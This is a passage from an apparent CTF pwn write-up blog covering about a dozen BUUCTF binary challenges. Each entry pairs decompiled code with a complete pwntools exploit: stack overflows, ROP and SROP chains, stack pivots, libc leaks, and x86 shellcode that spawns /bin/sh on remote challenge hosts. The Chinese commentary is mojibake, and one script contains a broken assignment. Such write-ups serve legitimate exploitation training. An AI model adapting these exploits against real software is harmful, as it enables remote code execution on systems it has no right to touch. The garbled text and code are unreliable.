process(&quot;./ciscn_2019_n_3&quot;)#p = remote(rmt,port)def newnote(idx,type,value,length=0): p.recvuntil(&quot;CNote &gt; &quot;) p.sendline(str(1)) p.recvuntil(&quot;Index &gt; &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Type &gt; &quot;) p.sendline(str(type)) if type == 1: p.recvuntil(&quot;Value &gt; &quot;) p.sendline(str(value)) else: p.recvuntil(&quot;Length &gt; &quot;) p.sendline(str(length)) p.recvuntil(&quot;Value &gt; &quot;) if length == 8: p.send(value) else: p.sendline(value)def delnote(idx): p.recvuntil(&quot;CNote &gt; &quot;) p.sendline(str(2)) p.recvuntil(&quot;Index &gt; &quot;) p.sendline(str(idx))def shownote(idx): p.recvuntil(&quot;CNote &gt; &quot;) p.sendline(str(3)) p.recvuntil(&quot;Index &gt; &quot;) p.sendline(str(idx))if __name__ == &quot;__main__&quot;: newnote(0,2,&#x27;a&#x27;*10,0x88) newnote(1,2,&#x27;a&#x27;*10,0x38) gdb.attach(p) newnote(2,1,0x41) #newnote(2,2,&#x27;b&#x27;*10,0x38) delnote(1) delnote(2) newnote(3,2,&#x27;aaaa&#x27;+p32(elf.plt[&#x27;system&#x27;]),0xc) #gdb.attach(p) newnote(4,2,&quot;/bin/sh\\x00&quot;,0x38) delnote(1) p.interactive() ciscn_2019_n_5 1.checksec 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments 2.IDA main 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-20h] setvbuf(stdout, 0LL, 2, 0LL); puts(&quot;tell me your name&quot;); read(0, &amp;name, 0x64uLL); puts(&quot;wow~ nice name!&quot;); puts(&quot;What do you want to say to me?&quot;); gets(&amp;v4, &amp;name); return 0;&#125; name 123456789.bss:0000000000601080 public name.bss:0000000000601080 name db ? ; ; DATA XREF: main+35â†‘o.bss:0000000000601081 db ? ;.bss:0000000000601082 db ? ;.bss:0000000000601083 db ? ;.bss:0000000000601084 db ? ;.bss:0000000000601085 db ? ;.bss:0000000000601086 db ? ;.bss:0000000000601087 db ? ; æ—¢ç„¶æ²¡æœ‰ä¿æŠ¤ï¼Œåº”è¯¥æ˜¯shellcodeï¼Œæ‰€ä»¥ä¸è¦å¾€å¤æ‚çš„æ–¹å‘æƒ³ shellcode + æº¢å‡º + æ ˆè½¬ç§» 3.EXP 123456789101112131415from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26651)elf = ELF(&quot;./ciscn_2019_n_5&quot;)context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)name_addr = 0x0601080shellcode = asm(shellcraft.sh())p.recvuntil(&#x27;tell me your name\\n&#x27;)p.sendline(shellcode)payload = &#x27;a&#x27;*(0x20+8)+p64(name_addr)p.recvuntil(&#x27;me?&#x27;)p.sendline(payload)p.interactive() contextçš„ç±»å‹ä¸€å®šè¦å†™ ciscn_2019_n_8 1.checksec() 123456[*] &#x27;/root/download/BUUCTF/ciscn_2019_n_8/ciscn_2019_n_8&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled å…¨ä¿æŠ¤ï¼Œæˆ‘å°¿äº† 2.IDA main 12345678910111213141516171819202122232425262728293031323334353637383940int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp-14h] [ebp-20h] int v5; // [esp-10h] [ebp-1Ch] var[13] = 0; var[14] = 0; init(); puts(&quot;What&#x27;s your name?&quot;); __isoc99_scanf(&quot;%s&quot;, var, v4, v5); // ====+STACK_OVERFLOW+==== if ( *(_QWORD *)&amp;var[13] ) &#123; if ( *(_QWORD *)&amp;var[13] == 17LL ) system(&quot;/bin/sh&quot;); else printf( &quot;something wrong! val is %d&quot;, var[0], var[1], var[2], var[3], var[4], var[5], var[6], var[7], var[8], var[9], var[10], var[11], var[12], var[13], var[14]); &#125; else &#123; printf(&quot;%s, Welcome!\\n&quot;, var); puts(&quot;Try do something~&quot;); &#125; return 0;&#125; ç¬¬ä¸€ä¸ªè¾“å…¥è®©var[13]ä¸º17å¯ä»¥è¿›å…¥,ä¸ç®¡ç”¨å•¥æ–¹å¼ï¼Œè¦†ç›–52ä¸ªä½ç½®å°±å¯ä»¥ä¼ é€’17è¿™ä¸ªæ•°å­—äº†ï¼Œè¶…çº§ç®€å• 3.EXP 1234567from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26629)#p = process(&quot;./ciscn_2019_n_8&quot;)payload = &quot;a&quot;*52 + p32(17)p.sendlineafter(&quot;?&quot;,payload)p.interactive() ciscn_2019_ne_5 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // [esp+0h] [ebp-100h] char src[4]; // [esp+4h] [ebp-FCh] char v5; // [esp+8h] [ebp-F8h] char s1[4]; // [esp+84h] [ebp-7Ch] char v7; // [esp+88h] [ebp-78h] int *v8; // [esp+F4h] [ebp-Ch] v8 = &amp;argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(&amp;v7, 0, 0x60u); *(_DWORD *)src = 0x30; memset(&amp;v5, 0, 0x7Cu); puts(&quot;Welcome to use LFS.&quot;); printf(&quot;Please input admin password:&quot;); __isoc99_scanf((int)&quot;%100s&quot;, (int)s1); if ( strcmp(s1, &quot;administrator&quot;) ) &#123; puts(&quot;Password Error!&quot;); exit(0); &#125; puts(&quot;Welcome!&quot;); while ( 1 ) &#123; puts(&quot;Input your operation:&quot;); puts(&quot;1.Add a log.&quot;); puts(&quot;2.Display all logs.&quot;); puts(&quot;3.Print all logs.&quot;); printf(&quot;0.Exit\\n:&quot;); __isoc99_scanf((int)&quot;%d&quot;, (int)&amp;v3); switch ( v3 ) &#123; case 0: exit(0); return; case 1: AddLog((int)src); break; case 2: Display(src); break; case 3: Print(); break; case 4: GetFlag(src); break; default: continue; &#125; &#125;&#125; GetFlag 12345678910int __cdecl GetFlag(char *src)&#123; char dest[4]; // [esp+0h] [ebp-48h] char v3; // [esp+4h] [ebp-44h] *(_DWORD *)dest = 0x30; memset(&amp;v3, 0, 0x3Cu); strcpy(dest, src); return printf(&quot;The flag is your log:%s\\n&quot;, dest);&#125; å–ç¨‹åºé‡Œé¢fflushçš„shå¡«å…¥systemå‚æ•°+æ ˆæº¢å‡º 3.EXP 123456789101112131415161718192021222324from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,26685)#p = process(&quot;./ciscn_2019_ne_5&quot;)elf = ELF(&quot;./ciscn_2019_ne_5&quot;)sys_addr = elf.plt[&#x27;system&#x27;]sh_addr = 0x080482E0+0xApayload = &#x27;a&#x27;*(0x48+4)+p32(sys_addr)+&#x27;aaaa&#x27;+p32(sh_addr)p.recvuntil(&#x27;Please input admin password:&#x27;)p.sendline(&#x27;administrator&#x27;)p.recvuntil(&#x27;0.Exit\\n:&#x27;)p.sendline(&#x27;1&#x27;)p.recvuntil(&#x27;Please input new log info:&#x27;)p.sendline(payload)p.recvuntil(&#x27;0.Exit\\n:&#x27;)p.sendline(&#x27;4&#x27;)p.interactive() ciscn_2019_s_3 1.checksec() 1234567root@joe1sn:~/download/BUUCTF/ciscn_2019_s_3# checksec ciscn_s_3[*] &#x27;/root/download/BUUCTF/ciscn_2019_s_3/ciscn_s_3&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 2.IDA main 1234int __cdecl main(int argc, const char **argv, const char **envp)&#123; return vuln();&#125; vuln 123456789signed __int64 vuln()&#123; signed __int64 result; // rax __asm &#123; syscall; LINUX - sys_read &#125; result = 1LL; __asm &#123; syscall; LINUX - sys_write &#125; return result;&#125; å±…ç„¶æ˜¯æ±‡ç¼–ï¼Œè¿™ç§é¢˜ä»æ¥æ²¡é‡è§è¿‡ ä¸è¿‡çœ‹å¾—å‡ºæ¥(ç»“åˆæ±‡ç¼–) sys_writeï¼šå‘æ ˆä¸Šå†™æ•°æ®(0x400) sys_readï¼šä»æ ˆä¸Šè¯»æ•°æ®(0x30) æŸ¥äº†æŸ¥WP https://blog.csdn.net/github_36788573/article/details/103541178 3WriteUpåˆ†æ ä¸»è¦æ˜¯gadgetå‡½æ•°æœ‰ä¸œè¥¿ 12345678910; __unwind &#123;push rbpmov rbp, rspmov rax, Fhretnmov rax, 59retnpop rbpretn&#125; // starts at 4004D6 å…ˆæ˜¯å‘raxä¼ é€’äº†0xfï¼Œåœ¨linuxçš„ç³»ç»Ÿè°ƒç”¨è¡¨ç¤º sys_rt_sigreturn(unsigned long _unused) 15å·ç³»ç»Ÿè°ƒç”¨sigreturnã€‚è¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ˜¯åœ¨ç»ˆæ­¢ä¿¡å·æ¢å¤ç”¨æˆ·æ€ç¯å¢ƒæ—¶ç”¨çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨æ ˆä¸Šä¼ªé€ å¯„å­˜å™¨çš„å€¼ï¼Œé‚£ä¹ˆæ¢å¤æ—¶å°±å¯å°†å¯„å­˜å™¨æ§åˆ¶ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚ å‘raxä¼ é€’äº†59ï¼Œåœ¨linuxçš„ç³»ç»Ÿè°ƒç”¨è¡¨ç¤º sys_exec(const char *filename,const char *const argv[],const char *,const envp[]) å°±ç›¸å½“äºsystemå‡½æ•° 59å·ç³»ç»Ÿè°ƒç”¨æ˜¯execveé‚£ä¹ˆå°±å¯ä»¥æƒ³åŠæ³•æ§åˆ¶å¯„å­˜å™¨çš„å€¼è°ƒç”¨execve(â€œ/bin/shâ€,0,0)ï¼Œæ³¨æ„åœ¨è°ƒç”¨execveæ—¶ï¼Œåé¢ä¸¤ä¸ªå‚æ•°éœ€è¦ç½®0ï¼Œç”±äºéœ€è¦æ§åˆ¶rdxçš„å€¼ï¼Œæ‰€ä»¥é€‰æ‹©ä½¿ç”¨é€šç”¨gadgetï¼Œ__libc_csu_initã€‚ è¿™å°±å¼•ç”³å‡ºä¸¤ç§è§£é¢˜æ–¹æ³• 4.1 59å·ç³»ç»Ÿè°ƒç”¨ ropgadget 12345678910111213141516171819202122Gadgets information============================================================0x00000000004004a3 : mov byte ptr [rip + 0x200b86], 1 ; ret0x00000000004004e3 : mov eax, 0x3b ; ret0x00000000004004db : mov eax, 0xf ; ret0x00000000004004d8 : mov ebp, esp ; mov rax, 0xf ; ret0x00000000004004e2 : mov rax, 0x3b ; ret0x00000000004004da : mov rax, 0xf ; ret0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop r14 ; pop r15 ; ret0x00000000004005a2 : pop r15 ; ret0x00000000004004a2 : pop rbp ; mov byte ptr [rip + 0x200b86], 1 ; ret0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400440 : pop rbp ; ret0x00000000004005a3 : pop rdi ; ret0x00000000004005a1 : pop rsi ; pop r15 ; ret0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004003a9 : retUnique gadgets found: 18 3.EXP 1234567891011121314151617181920212223from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26249)vuln_addr = 0x04004EDexecv = 0x04004E2pop_rdi = 0x04005A3pop_5_ret = 0x040059Amov_RDX_r13 =0x0400580sys_write = 0x0400517payload = &quot;/bin/sh\\x00&quot;*2 + p64(vuln_addr)p.send(payload)p.recv(0x20) = u64(p.recv(8)) - 280print(hex( ))payload = &quot;/bin/sh\\x00&quot;*2 + p64(pop_5_ret) + p64(0)*2payload += p64( +0x50)+p64(0)*3payload += p64(mov_RDX_r13) + p64(execv)payload += p64(pop_rdi) + p64( ) + p64(sys_write)p.send(payload)p.interactive() è¿™ä¸ªEXPæ˜¯å¯ä»¥æ‰“é€šçš„ï¼Œçœ‹ä¸Šå»å’Œæ™®é€šwriteæ³„éœ²libcçš„EXPå·®ä¸å¤š å…¶å®åŒ…å«äº†å¾ˆå¤šæ±‡ç¼–çš„åº•å±‚çŸ¥è¯† 4.2FramingSignals-AReturntoPortableShellcode SROP FramingSignals-AReturntoPortableShellcode 1234567891011121314151617181920212223242526272829from pwn import *io=process(&#x27;./ciscn_s_3&#x27;)main=0x0004004EDsigret=0x4004DAsys=0x400517pl1=&#x27;/bin/sh\\x00&#x27;*2+p64(main)io.send(pl1)io.recv(0x20)sh=u64(io.recv(8))-280print(hex(sh))frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = shframe.rsi = 0frame.rdx = 0frame.rip = syspl1=&#x27;a&#x27;*16+p64(sigret)+p64(sys)+str(frame)&#x27;&#x27;&#x27;def debug(addr): raw_input(&#x27;debug:&#x27;) gdb.attach(io, &quot;b *&quot; + addr)debug(&#x27;0x400514&#x27;)&#x27;&#x27;&#x27;pl2=&#x27;/bin/sh\\x00&#x27;*2+p64(sigret)+p64(sys)+str(frame)io.send(pl2)io.interactive() å‚è€ƒå—æ¢¦çš„æ‰“æ³• [CTF-BUUCTF-Pwnåˆ·é¢˜ä¹‹æ—…-](https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/ ciscn_2019_s_4 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA vuln 12345678910int vul()&#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); read(0, &amp;s, 0x30u); printf(&quot;Hello, %s\\n&quot;, &amp;s); read(0, &amp;s, 0x30u); return printf(&quot;Hello, %s\\n&quot;, &amp;s);&#125; ä¸¤æ¬¡å¾ˆçŸ­çš„æ ˆæº¢å‡ºï¼Œç¬¬ä¸€æ¬¡ebp leakï¼Œç¬¬äºŒæ¬¡leave ret 3.GDB **1.**è¾“å…¥0x20+4ä¸ªå­—ç¬¦ä¸²ï¼Œæ³„éœ²ebp 123ECX: 0xffffcff0 (&#x27;a&#x27; &lt;repeats 36 times&gt;, &quot;\\n\\320\\377\\377(\\320\\377\\377*\\206\\004\\b\\334c\\373\\367@\\320\\377\\377&quot;)................EBP: 0xffffd018 --&gt; 0xffffd028 --&gt; 0x0 12&gt;&gt;&gt; hex(0xffffcff0- 0xffffd018)&#x27;-0x28&#x27; ä¸‹ä¸€æ­¥æ—¶ï¼Œç¨‹åºä¼šæŠ¬æ ˆï¼Œæ‰€ä»¥è¿™æ—¶å€™çš„bufä¸º0xffffd028ï¼Œåç§»é‡ä¸º0x28-0x10 2.æ„é€ payload ä¸»è¦ç›®æ ‡æ˜¯ï¼šè®©ç¨‹åºretåˆ°æ ˆå¼€å§‹çš„åœ°æ–¹ï¼Œå°†åˆšæ‰æ„é€ çš„payloadå½“ä½œå‘½ä»¤æ‰§è¡Œ 1pl2=(&#x27;aaaa&#x27;+p32(sys_plt)+&#x27;bbbb&#x27;+p32(buf+0x10)+&#x27;/bin/sh\\x00&#x27;).ljust(0x28,&#x27;a&#x27;)+p32(buf)+p32(leave) 4.EXP 12345678910111213141516171819202122from pwn import *context.log_level = &quot;debug&quot;#p = remote(&quot;node3.buuoj.cn&quot;,&quot;26826&quot;)p = process(&quot;./ciscn_s_4&quot;)elf = ELF(&quot;./ciscn_s_4&quot;)leave=0x8048562sys_plt=0x8048400pl1=&#x27;a&#x27;*0x24+&#x27;bbbb&#x27;p.send(pl1)p.recvuntil(&#x27;bbbb&#x27;)ebp=u32(p.recv(4))success(&quot;EBP =&gt;0x%x&quot;,ebp)context.terminal=[&quot;tmux&quot;,&#x27;splitw&#x27;,&#x27;-h&#x27;]gdb.attach(p)buf=ebp-0x38pl2=(&#x27;aaaa&#x27;+p32(sys_plt)+&#x27;bbbb&#x27;+p32(buf+16)+&#x27;/bin/sh\\x00&#x27;).ljust(0x28,&#x27;a&#x27;)+p32(buf)+p32(leave)p.send(pl2)p.interactive() cisncn_2019_s_6 å’Œciscn_2019_es_1ä¸€æ · ciscn_2019_s_9 1.checksec 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments ä¼°è®¡å’Œshellcodeç›¸å…³ 2.IDA pwn 1234567891011121314int pwn()&#123; char s[24]; // [esp+8h] [ebp-20h] puts(&quot;\\nHey! ^_^&quot;); puts(&quot;\\nIt&#x27;s nice to meet you&quot;); puts(&quot;\\nDo you have anything to tell?&quot;); puts(&quot;&gt;&quot;); fflush(stdout); fgets(s, 50, stdin); puts(&quot;OK bye~&quot;); fflush(stdout); return 1;&#125; ç¬¬åè¡Œæ ˆæº¢å‡º hint 123456789; Attributes: bp-based frame;void hintpublic hinthint proc near; __unwind &#123;push ebpmov ebp, espjmp esphint endp åˆ©ç”¨jmp espå®ç°è·³è½¬ 3.EXP 123456789101112from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./ciscn_s_9&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;25940&quot;)shellcode = &quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;gadget = asm(&quot;sub esp,0x28 ; jmp esp&quot;)jmp_esp = 0x08048554payload = shellcode.ljust(0x24,&#x27;\\x00&#x27;)+p32(jmp_esp)+gadgetp.sendline(payload)p.interactive() cmcc_pwnme1 1.checksec 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 2.IDA getfruit 123456789int getfruit()&#123; char v1; // [esp+14h] [ebp-A4h] fflush(stdout); printf(&quot;Please input the name of fruit:&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v1); return printf(&quot;oh,%s...\\n&quot;, &amp;v1);&#125; æ ˆæº¢å‡º 3.EXP 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwnme1&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;28427&quot;)puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]getfruit = 0x08048624payload = &#x27;a&#x27;*(0xA4+4)payload += p32(puts_plt)+p32(getfruit)+p32(puts_got)p.sendlineafter(&quot;&gt;&gt; 6. Exit &quot;,&#x27;5&#x27;)p.sendlineafter(&quot;Please input the name of fruit:&quot;,payload)puts_real = u32(p.recvuntil(&#x27;\\xf7&#x27;)[-4:].ljust(4,&#x27;\\x00&#x27;))libc = LibcSearcher(&quot;puts&quot;,puts_real)base = puts_real-libc.dump(&quot;puts&quot;)sys_addr = base+libc.dump(&quot;system&quot;)binsh = base+libc.dump(&quot;str_bin_sh&quot;)success(&quot;libc base 0x%x&quot;,base)success(&quot;binsh 0x%x&quot;,binsh)success(&quot;system 0x%x&quot;,sys_addr)payload = &#x27;a&#x27;*(0xA4+4)payload += p32(sys_addr)+&#x27;aaaa&#x27;+p32(binsh)p.sendlineafter(&quot;Please input the name of fruit:&quot;,payload)p.interactive() cmcc_pwnme2 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA userfunction 123456int __cdecl userfunction(char *src)&#123; char dest; // [esp+Ch] [ebp-6Ch] strcpy(&amp;dest, src); return printf(&quot;Hello, %s\\n&quot;, src);&#125; ä¹‹å‰åœ¨mainé‡Œé¢è¾“å…¥è¿‡å¤šçš„è¯ï¼Œä¼šå¯¼è‡´è¿™é‡Œæ ˆæº¢å‡º exec_string 12345678910111213int exec_string()&#123; char s; // [esp+Bh] [ebp-Dh] FILE *stream; // [esp+Ch] [ebp-Ch] stream = fopen(&amp;string, &quot;r&quot;); if ( !stream ) perror(&quot;Wrong file&quot;); fgets(&amp;s, 50, stream); puts(&amp;s); fflush(stdout); return fclose(stream);&#125; stringå˜é‡åœ¨bssæ®µä¸Šï¼Œè¦æƒ³æ‰§è¡Œå®ƒï¼Œå°±å¿…é¡»æŠŠ/flagå‘½ä»¤å†™åˆ°stringä¸Šï¼Œè¿™é‡Œå°±å¯ä»¥æ„é€ payload 3.EXP 1234567891011121314from pwn import *context.log_level = &quot;debug&quot;sh = remote(&quot;node3.buuoj.cn&quot;,28490)elf = ELF(&quot;pwnme2&quot;)pop_ebp_ret = 0x08048680offset = 0x6C+4payload = offset * &quot;a&quot;payload += p32(elf.plt[&#x27;gets&#x27;])payload += p32(pop_ebp_ret)payload += p32(0x0804A060)#bss_stringpayload += p32(0x080485CB)#exec_stringsh.sendlineafter(&quot;Please input:&quot;,payload)sh.sendline(&quot;/flag&quot;)sh.interactive() cmcc_simplerop 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA å‘ç°äº†è¶…çº§å¤šçš„æ— ç”¨å‡½æ•° main 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+1Ch] [ebp-14h] puts(&quot;ROP is easy is&#x27;nt it ?&quot;); printf(&quot;Your input :&quot;); fflush(stdout); return read(0, &amp;v4, 100);&#125; å¾ˆæ˜æ˜¾çš„readæº¢å‡ºï¼Œä½†æ˜¯ä¸å¤§å¥½çš„æ„é€ ropchain,æ‰€ä»¥å…ˆç”¨ROPgadgetè‡ªåŠ¨ç”Ÿæˆropchainï¼Œä½†æ˜¯éœ€è¦è°ƒæ•´é•¿åº¦ ROPgadget --binary simplerop --ropchain 3.EXP 123456789101112131415161718192021222324252627from pwn import *from struct import pack#io=process(&#x27;./simplerop&#x27;)io=remote(&quot;node3.buuoj.cn&quot;,25035)io.recvuntil(&#x27;:&#x27;)# Padding goes herep = &#x27;a&#x27;*0x14+p32(1)*3p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; retp += &#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; retp += &#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806e850) # pop edx pop ecx pop edx; retp += pack(&#x27;&lt;I&#x27;, 0x0)p += pack(&#x27;&lt;I&#x27;, 0x0)p += pack(&#x27;&lt;I&#x27;, 0x080ea060) #bin/shp += pack(&#x27;&lt;I&#x27;, 0x080bae06) #pop eaxp += pack(&#x27;&lt;I&#x27;, 0xb) # eax=0xbp += pack(&#x27;&lt;I&#x27;, 0x080493e1) #int 80io.send(p)io.interactive()print hex(len(p)) ez_pz_hackover_2016 1.checksec 123456Arch: i386-32-littleRELRO: Full RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 2.IDA main 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdout, 0); header(); chall(); return 0;&#125; chall 123456789101112131415161718192021int chall()&#123; size_t v0; // eax int result; // eax char s; // [esp+Ch] [ebp-40Ch] _BYTE *v3; // [esp+40Ch] [ebp-Ch] printf(&quot;Yippie, lets crash: %p\\n&quot;, &amp;s); printf(&quot;Whats your name?\\n&quot;); printf(&quot;&gt; &quot;); fgets(&amp;s, 1023, stdin); v0 = strlen(&amp;s); v3 = memchr(&amp;s, 10, v0); if ( v3 ) *v3 = 0; printf(&quot;\\nWelcome %s!\\n&quot;, &amp;s); result = strcmp(&amp;s, &quot;crashme&quot;); if ( !result ) result = vuln((unsigned int)&amp;s, 0x400u); return result;&#125; vuln 123456void *__cdecl vuln(char src, size_t n)&#123; char dest; // [esp+6h] [ebp-32h] return memcpy(&amp;dest, &amp;src, n);&#125; strlen()é‡è§â€™\\x00â€™æˆªæ–­ s å’Œ vulné‡Œé¢dest çš„ebp çš„è·ç¦» memchræ¯”è¾ƒå‰åä¸ªå­—ç¬¦ä¸² 3.EXP 123456789101112from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29397)#p = process(&quot;./ez_pz_hackover_2016&quot;)p.recvuntil(&quot;Yippie, lets crash: 0x&quot;)stack_addr = int(p.recv(8),16)print hex(stack_addr)payload = &quot;crashme\\x00&quot; + &#x27;a&#x27;*(0x40-0x32+4) payload += p32(stack_addr-(0x40-0x32+4+10)) + asm(shellcraft.sh())p.sendlineafter(&quot;&gt; &quot;,payload)p.interactive() get_started_3dsctf_2016 1.checksec() 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+4h] [ebp-38h] printf(&quot;Qual a palavrinha magica? &quot;, v4); gets(&amp;v4); return 0;&#125; get_flag 123456789101112131415161718192021222324252627void __cdecl get_flag(int a1, int a2)&#123; int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 814536271 &amp;&amp; a2 == 425138641 ) &#123; v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;); v3 = v2; v4 = getc(v2); if ( v4 != 255 ) &#123; v5 = (char)v4; do &#123; putchar(v5); v6 = getc(v3); v5 = (char)v6; &#125; while ( v6 != 255 ); &#125; fclose(v3); &#125;&#125; å…¶å®ä¸»è¦åˆ†æå¯çŸ¥ï¼Œè¿™ä¸ªç¨‹åºçš„å¤§è‡´æ„æ€æ˜¯ä¿®æ”¹eipæ”¹å˜ç¨‹åºæµï¼Œæœ€åæ‰§è¡Œcat_flag ä½†æ˜¯BUUè¿œç¨‹æ‰“ä¸é€šï¼Œè¦ä½¿ç”¨mprotecå‡½æ•°ä¿®æ”¹å†…å­˜çš„æƒé™ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œå†ä½¿ç”¨readå‡½æ•°å†™å…¥shellcodeåˆ°è¢«è§£æ”¾çš„bssæ®µ mprotectåŸå‹ 12#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot); æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œå°±è¦ppp_ret 3.EXP 123456789101112131415from pwn import *#context.log_level = &quot;debug&quot;p=remote(&#x27;node3.buuoj.cn&#x27;,28495)elf=ELF(&#x27;./get_started_3dsctf_2016&#x27;)pop3_ret = 0x0804951Dget_flag = 0x080489A0got_addr = 0x080EB000payload = &#x27;a&#x27;*0x38+p32(elf.symbols[&#x27;mprotect&#x27;])payload += p32(pop3_ret)+p32(got_addr)+p32(0x1d8c)+p32(0x7)payload += p32(elf.symbols[&#x27;read&#x27;])payload += p32(pop3_ret)+p32(0)+p32(got_addr)+p32(0x100)+p32(got_addr)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive() gyctf_2020_borrowstack 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-60h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(&amp;s); read(0, &amp;buf, 0x70uLL); puts(&quot;Done!You can check and use your borrow stack now!&quot;); read(0, &amp;bank, 0x100uLL); return 0;&#125; ç¬¬ä¸€æ­¥æ ˆè¿ç§»ï¼Œç¬¬äºŒæ­¥æŠ¬é«˜æ ˆäº†è¿‡ålibc leakï¼Œç¨‹åºè¿”å›è‡³ç¬¬ä¸€ä¸ªreadï¼Œç¬¬ä¸‰æ­¥one gadgetæ¥getshell 3.EXP 123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = &quot;debug&quot;io=remote(&#x27;node3.buuoj.cn&#x27;,25707)bank=0x0601080leave=0x400699puts_plt=0x04004E0puts_got=0x0601018pop_rdi=0x400703main=0x0400626ret=0x4004c9io.recvuntil(&#x27;u want&#x27;)pl1=&#x27;a&#x27;*0x60+p64(bank)+p64(leave)io.send(pl1)io.recvuntil(&#x27;now!&#x27;)pl2=p64(ret)*20 #æŠ¬é«˜æ ˆ&#x27;&#x27;&#x27;retæŒ‡ä»¤ç”¨æ 